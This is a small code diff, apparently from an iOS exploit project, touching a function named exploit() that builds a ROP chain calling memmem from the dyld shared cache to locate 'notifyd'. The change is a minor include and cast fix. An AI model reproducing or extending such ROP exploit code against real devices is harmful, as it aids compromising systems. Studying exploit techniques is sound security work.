@@ -2,6 +2,7 @@
 #include "fsgen.hpp"
 
 #include "defines.hpp"
+#include "fsgen-global-constants.hpp"
 
 #include "endianness.hpp"
 #include "rop.hpp"
@@ -491,7 +492,8 @@ void exploit()
     ropLoadReg0(aLength);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aLength to PLACE_HOLDER2
     ropCall4(
-        dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newBinary("\0\0notifyd", 9), 9);
+        dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER,
+        newBinary((void*) "\0\0notifyd", 9), 9);
 
     ropSubReg0Const(137);
     ropDerefReg0();
